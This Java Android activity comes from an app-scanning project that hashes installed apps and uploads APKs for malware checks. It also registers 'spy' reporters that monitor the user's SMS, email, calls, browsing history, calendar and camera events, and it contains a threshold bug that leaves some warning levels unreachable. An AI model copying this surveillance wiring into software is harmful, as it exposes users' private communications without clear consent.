package th.ac.bu.mcop.activities;

import android.Manifest;
import android.animation.AnimatorInflater;
import android.animation.AnimatorSet;
import android.app.ActivityManager;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.support.annotation.NonNull;
import android.support.annotation.Nullable;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.support.v4.content.LocalBroadcastManager;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.TextView;

import java.io.File;
import java.util.ArrayList;

import okhttp3.MediaType;
import okhttp3.RequestBody;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;
import th.ac.bu.mcop.R;
import th.ac.bu.mcop.android.monitor.AndroidWatchdogService;
import th.ac.bu.mcop.android.monitor.core.AndroidEvent;
import th.ac.bu.mcop.android.monitor.core.AndroidWatchdog;
import th.ac.bu.mcop.android.monitor.observer.AndroidBrowsingHistoryWatcher;
import th.ac.bu.mcop.android.monitor.observer.AndroidCalendarWatcher;
import th.ac.bu.mcop.android.monitor.observer.AndroidCallWatcher;
import th.ac.bu.mcop.android.monitor.observer.AndroidCameraWatcher;
import th.ac.bu.mcop.android.monitor.observer.AndroidEmailWatcher;
import th.ac.bu.mcop.android.monitor.observer.AndroidGpsWatcher;
import th.ac.bu.mcop.android.monitor.observer.AndroidSmsWatcher;
import th.ac.bu.mcop.android.monitor.observer.AndroidWatcher;
import th.ac.bu.mcop.android.spy.ConfiguratingWatcher;
import th.ac.bu.mcop.android.spy.reporter.BrowsingHistorySpyReporter;
import th.ac.bu.mcop.android.spy.reporter.CalendarSpyReporter;
import th.ac.bu.mcop.android.spy.reporter.CallSpyReporter;
import th.ac.bu.mcop.android.spy.reporter.GpsSpyReporter;
import th.ac.bu.mcop.android.spy.reporter.MailSpyReporter;
import th.ac.bu.mcop.android.spy.reporter.MediaSpyReporter;
import th.ac.bu.mcop.android.spy.reporter.SmsSpyReporter;
import th.ac.bu.mcop.android.spy.reporter.SpyReporter;
import th.ac.bu.mcop.broadcastreceiver.IntenetReceiver;
import th.ac.bu.mcop.mobile.monitor.core.Event;
import th.ac.bu.mcop.mobile.monitor.core.Watchdog;
import th.ac.bu.mcop.models.AppsInfo;
import th.ac.bu.mcop.models.realm.AppRealm;
import th.ac.bu.mcop.models.response.ReportHeaderModel;
import th.ac.bu.mcop.models.response.ReportModel;
import th.ac.bu.mcop.models.response.ResponseDataModel;
import th.ac.bu.mcop.models.response.ResponseModel;
import th.ac.bu.mcop.modules.api.ApiManager;
import th.ac.bu.mcop.modules.api.ApplicationInfoManager;
import th.ac.bu.mcop.services.BackgroundService;
import th.ac.bu.mcop.utils.Constants;
import th.ac.bu.mcop.utils.Settings;

public class HomeActivity extends AppCompatActivity implements View.OnClickListener{

    private Button mAboutButton, mManageAppButton, mStartLogButton;
    private TextView mTotalInstalledAppTextView, mAppUsingInternetTextView, mMessageTextView;
    private TextView mStatusSafeTextView, mAmountWarningTextView;
    private ImageView mCircleImageview, mRadarCircleImage1, mRadarCircleImage2, mRadarCircleImage3;
    private LinearLayout mContainerWarningLenearLayout;
    public static TextView mTestSMSTextView;
    private IntenetReceiver mIntenetReceiver;

    private static AndroidWatchdog mWatchdog;
    private BroadcastReceiver mReceiver;

    public static final String APPLICATION_TAG = "spiderman";
    public static final String PASSWORD_FIELD = "password";
    public static final String USERNAME_FIELD = "username";

    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_home);

        mTotalInstalledAppTextView = (TextView) findViewById(R.id.number_total_install_textview);
        mAppUsingInternetTextView = (TextView) findViewById(R.id.number_app_using_internet_textview);
        mAboutButton = (Button) findViewById(R.id.about_button);
        mManageAppButton = (Button) findViewById(R.id.manage_app_button);
        mStartLogButton = (Button) findViewById(R.id.start_log_button);
        mMessageTextView = (TextView) findViewById(R.id.message_textview);
        mStatusSafeTextView = (TextView) findViewById(R.id.status_safe_textview);
        mCircleImageview = (ImageView) findViewById(R.id.circle_imageview);
        mRadarCircleImage1 = (ImageView) findViewById(R.id.radar_circle_imageview1);
        mRadarCircleImage2 = (ImageView) findViewById(R.id.radar_circle_imageview2);
        mRadarCircleImage3 = (ImageView) findViewById(R.id.radar_circle_imageview3);
        mAmountWarningTextView = (TextView) findViewById(R.id.amount_warning_textview);
        mContainerWarningLenearLayout = (LinearLayout) findViewById(R.id.container_warning_linearlayout);
        mTestSMSTextView = (TextView) findViewById(R.id.test_sms_textview);

        mManageAppButton.setOnClickListener(this);
        mAboutButton.setOnClickListener(this);
        mStartLogButton.setOnClickListener(this);

        ArrayList<ApplicationInfo> applicationInstalled = ApplicationInfoManager.getTotalApplication(this);
        ArrayList<ApplicationInfo> applicationUsingInternet = ApplicationInfoManager.getTotalApplicationUsingInternet(this);

        mTotalInstalledAppTextView.setText(applicationInstalled.size() + "");
        mAppUsingInternetTextView.setText(applicationUsingInternet.size() + "");

        mIntenetReceiver = new IntenetReceiver();

        // start sms
        if (Build.VERSION.SDK_INT >= 23){
            requestReadSMSPermission();
        } else {
            initSMSWatch();
        }
    }

    @Override
    protected void onDestroy() {
        mWatchdog.clear();
        unregisterReceiver(mReceiver);
        super.onDestroy();
    }

    @Override
    protected void onStart() {
        super.onStart();

        LocalBroadcastManager.getInstance(this).registerReceiver(mMessageRecevier, new IntentFilter(Constants.INTENT_FILTER_UPDATE_UI));
        LocalBroadcastManager.getInstance(this).registerReceiver(mIntenetReceiver, new IntentFilter(Constants.INTENT_FILTER_INTERNET));

        super.onStart();
        Settings.loadSetting(this);
        setAppSafeOrNotView();

        startCollection();

        animateScal();
        //animateRatate();

        //findAppForSendAPK();
        findAppForSendHash();
    }

    @Override
    protected void onStop() {
        try {
            unregisterReceiver(mMessageRecevier);
            unregisterReceiver(mIntenetReceiver);
        } catch (Exception ex) {
            ex.printStackTrace();
        }
        super.onStop();
    }

    private void animateScal(){

        AnimatorSet animator1 = (AnimatorSet) AnimatorInflater.loadAnimator(this, R.animator.scal3);
        animator1.setTarget(mRadarCircleImage1);
        animator1.start();

        AnimatorSet animator2 = (AnimatorSet) AnimatorInflater.loadAnimator(this, R.animator.scal3);
        animator2.setTarget(mRadarCircleImage2);
        animator2.setStartDelay(300);
        animator2.start();

        AnimatorSet animator3 = (AnimatorSet) AnimatorInflater.loadAnimator(this, R.animator.scal3);
        animator3.setTarget(mRadarCircleImage3);
        animator3.setStartDelay(600);
        animator3.start();
    }

    private void animateRatate(){

        AnimatorSet animator = (AnimatorSet) AnimatorInflater.loadAnimator(this, R.animator.rotate);
        animator.setTarget(mCircleImageview);
        animator.start();
    }

    /***********************************************
     Recheck APK and Hassh
     ************************************************/

    private void findAppForSendHash(){
        Log.d(Settings.TAG, "findAppForSendHash");
        ArrayList<AppRealm> apps = AppRealm.getSendHashApps();
        String resource = "";
        for (AppRealm app : apps){
            resource += app.getHash() + ",";
        }

        sendHash(resource);
    }

    private void findAppForSendAPK(){
        ArrayList<AppRealm> waitingSendAPK = AppRealm.getSendApkApps();
        for (AppRealm app : waitingSendAPK){
            sendApk(app.getHash());
        }
    }

    private void sendHash(String resource){

        ApiManager.getInstance().getReport(new Callback<ResponseModel<ReportHeaderModel<ArrayList<ReportModel>>>>() {
            @Override
            public void onResponse(Call<ResponseModel<ReportHeaderModel<ArrayList<ReportModel>>>> call, Response<ResponseModel<ReportHeaderModel<ArrayList<ReportModel>>>> response) {

                Log.d(Settings.TAG, "sendHash: " + response);

                if (response == null){
                    return;
                }

                if (response.body() == null){
                    return;
                }

                if (response.body().getResponse() == null){
                    return;
                }

                if (response.body().getResponse().getData() == null){
                    return;
                }

                if (response.body().getResponse().getData().size() <= 0){ // size = 0 because safe all
                    return;
                }

                ArrayList<ReportModel> reportModels = response.body().getResponse().getData();

                ArrayList<ReportModel> sendApkApps = new ArrayList<>();
                ArrayList<ReportModel> safeApps = new ArrayList<>();
                ArrayList<ReportModel> warningApps = new ArrayList<>();

                for (ReportModel model : reportModels){

                    float percent = model.getDetectionPercentage();

                    if (percent == 0){
                        sendApkApps.add(model);

                        //update status app status send apk
                        AppsInfo appInfo = AppRealm.getAppWithHash(model.getResource());
                        if (appInfo != null) {
                            appInfo.setAppStatus(Constants.APP_STATUS_WAIT_FOR_SEND_APK);
                            AppRealm.update(appInfo);
                        }

                    } else {
                        warningApps.add(model);
                        // update status app warning
                        AppsInfo appInfo = AppRealm.getAppWithHash(model.getResource());

                        if (appInfo != null) {
                            if (percent > 25){
                                appInfo.setAppStatus(Constants.APP_STATUS_WARNING_YELLOW);
                            } else if (percent > 50){
                                appInfo.setAppStatus(Constants.APP_STATUS_WARNING_ORANGE);
                            } else if (percent > 75){
                                appInfo.setAppStatus(Constants.APP_STATUS_WARNING_RED);
                            }

                            AppRealm.update(appInfo);
                        }
                    }
                }

                Log.d(Settings.TAG, "sendApkApps size : " + sendApkApps.size());
                Log.d(Settings.TAG, "safeApps size    : " + safeApps.size());
                Log.d(Settings.TAG, "warningApps size : " + warningApps.size());
            }

            @Override
            public void onFailure(Call<ResponseModel<ReportHeaderModel<ArrayList<ReportModel>>>> call, Throwable t) {
                Log.d(Settings.TAG, "onFailure: " + t.getLocalizedMessage());
            }
        }, resource);
    }

    private void sendApk(String packageName){
        Log.d(Settings.TAG, "sendApk");

        Log.d(Settings.TAG, "packageName: " + packageName);
        PackageManager packageManager = getPackageManager();
        try {
            PackageInfo packageInfo = packageManager.getPackageInfo(packageName, 0);
            String pathString = packageInfo.applicationInfo.sourceDir;
            File file = new File(pathString);

            Log.d(Settings.TAG, "file exists: " + file.exists());

            // create RequestBody instance from file
            Uri uri = Uri.fromFile(file);
            Log.d(Settings.TAG, "uri: " + uri);

            final RequestBody requestBody = RequestBody.create(MediaType.parse("multipart/form-data"), file);

            ApiManager.getInstance().uploadAPK(new Callback<ResponseModel<ResponseDataModel<ReportModel>>>() {
                @Override
                public void onResponse(Call<ResponseModel<ResponseDataModel<ReportModel>>> call, Response<ResponseModel<ResponseDataModel<ReportModel>>> response) {
                    Log.d(Settings.TAG, "sendApk onResponse");

                    ResponseModel<ResponseDataModel<ReportModel>> reportModel = response.body();

                    if (reportModel != null){

                        Log.d(Settings.TAG, "sendApk isResult: " + reportModel.isResult());
                        Log.d(Settings.TAG, "sendApk getError: " + reportModel.getError());

                        Log.d(Settings.TAG, "sendApk data: " + reportModel.getResponse().getData());

                        if (reportModel.getResponse().getData() != null){

                            if (reportModel.getResponse().getData().getResponseCode() == 0){
                                // update status app warning
                                AppsInfo appInfo = AppRealm.getAppWithHash(reportModel.getResponse().getData().getResource());
                                appInfo.setAppStatus(Constants.APP_STATUS_WAIT_FOR_SEND_HASH);
                                AppRealm.update(appInfo);
                            }
                        }
                    }
                }

                @Override
                public void onFailure(Call<ResponseModel<ResponseDataModel<ReportModel>>> call, Throwable t) {
                    Log.d(Settings.TAG, "sendApk onFailure: " + t.getMessage());
                }
            }, requestBody);

        } catch (PackageManager.NameNotFoundException e) {
            e.printStackTrace();
        }
    }

    /***********************************************
     OnClickListener
     ************************************************/

    @Override
    public void onClick(View view) {
        if (view.getId() == R.id.about_button){

            Intent intent = new Intent(this, AboutActivity.class);
            startActivity(intent);

        } else if (view.getId() == R.id.manage_app_button){

            Intent intent = new Intent(this, ApplistActivity.class);
            startActivity(intent);
        }
    }

    private void setAppSafeOrNotView(){

        ArrayList<AppRealm> yellowApps = AppRealm.getWarningYellowApps();
        ArrayList<AppRealm> orangeApps = AppRealm.getWarningOrangeApps();
        ArrayList<AppRealm> redApps = AppRealm.getWarningRedApps();

        ArrayList<AppRealm> warningApps = new ArrayList<>();
        warningApps.addAll(redApps);
        warningApps.addAll(orangeApps);
        warningApps.addAll(yellowApps);

        if (warningApps.size() > 0){
            mContainerWarningLenearLayout.setVisibility(View.VISIBLE);
            mStatusSafeTextView.setVisibility(View.INVISIBLE);
            mAmountWarningTextView.setText(warningApps.size() + "");
            mCircleImageview.setImageResource(R.drawable.radar_red);
            mRadarCircleImage1.setImageResource(R.drawable.inner_circle_red);
            mRadarCircleImage2.setImageResource(R.drawable.inner_circle_red);
            mRadarCircleImage3.setImageResource(R.drawable.inner_circle_red);
        } else {
            mContainerWarningLenearLayout.setVisibility(View.INVISIBLE);
            mStatusSafeTextView.setVisibility(View.VISIBLE);
            mCircleImageview.setImageResource(R.drawable.radar_red);
            mRadarCircleImage1.setImageResource(R.drawable.inner_circle_green);
            mRadarCircleImage2.setImageResource(R.drawable.inner_circle_green);
            mRadarCircleImage3.setImageResource(R.drawable.inner_circle_green);
        }
    }

    private BroadcastReceiver mMessageRecevier = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            //if(!isAppPaused) {}
        }
    };

    private void startCollection(){

        if(!isServiceRunning(BackgroundService.class)) { //service is stopped. Start it.
            Intent intent = new Intent(this, BackgroundService.class);
            startService(intent);
        }
    }

    private boolean isServiceRunning(Class<?> serviceClass) {
        ActivityManager manager = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
        for (ActivityManager.RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
            if (serviceClass.getName().equals(service.service.getClassName())) {
                return true;
            }
        }
        return false;
    }

    private void requestReadSMSPermission(){
        int hasSmsPermission = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS);
        if (hasSmsPermission != PackageManager.PERMISSION_GRANTED){
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_SMS}, Constants.REQUEST_READ_SMS);
            return;
        }

        initSMSWatch();
    }

    private void requestReadPhoneStatePermission(){
        int hasLocationPermission = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE);
        if (hasLocationPermission != PackageManager.PERMISSION_GRANTED){
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_PHONE_STATE}, Constants.REQUEST_READ_PHONE_STATE);
            return;
        }

        initSMSWatch();
    }

    private void requestReadCallLog(){
        int hasLocationPermission = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG);
        if (hasLocationPermission != PackageManager.PERMISSION_GRANTED){
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_CALL_LOG}, Constants.REQUEST_READ_CALL_LOG);
            return;
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        //grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED  is allow
        if (requestCode == Constants.REQUEST_READ_SMS){
            requestReadPhoneStatePermission();
        } else if (requestCode == Constants.REQUEST_READ_PHONE_STATE){
            requestReadCallLog();
        } else if (requestCode == Constants.REQUEST_READ_CALL_LOG){
            initSMSWatch();
        }
    }


    /***********************************************
     Init SMS
     ************************************************/
    private void initSMSWatch(){
        mWatchdog = new AndroidWatchdog();
        IntentFilter filter = new IntentFilter();
        initWatchdog(mWatchdog, filter);

        mReceiver = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                AndroidEvent event = new AndroidEvent(this, context, intent);
                mWatchdog.watch(event);
            }
        };
        registerReceiver(mReceiver, filter);
        startService(new Intent(this, AndroidWatchdogService.class));
    }

    private void initWatchdog(Watchdog watchdog, IntentFilter filter) {
        // Yeah, I also want to read my configuration from local preferences
        SharedPreferences settings = getSharedPreferences(
                APPLICATION_TAG, Context.MODE_PRIVATE);
        String username = settings.getString(USERNAME_FIELD, "");
        String password = settings.getString(PASSWORD_FIELD, "");
        SpyReporter.getSpyLogger().setAuthCredentials(username, password);
        // Monitor all interesting events
        register(new AndroidSmsWatcher(new SmsSpyReporter()), filter);
        register(new AndroidEmailWatcher(new MailSpyReporter()), filter);
        register(new AndroidCallWatcher(new CallSpyReporter()), filter);
        register(new AndroidBrowsingHistoryWatcher(new BrowsingHistorySpyReporter()), filter);
        register(new AndroidCalendarWatcher(new CalendarSpyReporter()), filter);
        register(new AndroidCameraWatcher(new MediaSpyReporter(username)), filter);
        // Configuration dialog
        register(new ConfiguratingWatcher(), filter);
    }

    protected final void register(AndroidWatcher watcher, IntentFilter filter) {
        mWatchdog.register(watcher.getObserver());
        Event event = new AndroidEvent(this, this, null);
        for (String action : watcher.getIntents()) {
            filter.addAction(action);
            watcher.start(event);
        }
    }

    public static AndroidWatchdog getWatchdog() {
        return mWatchdog;
    }
}
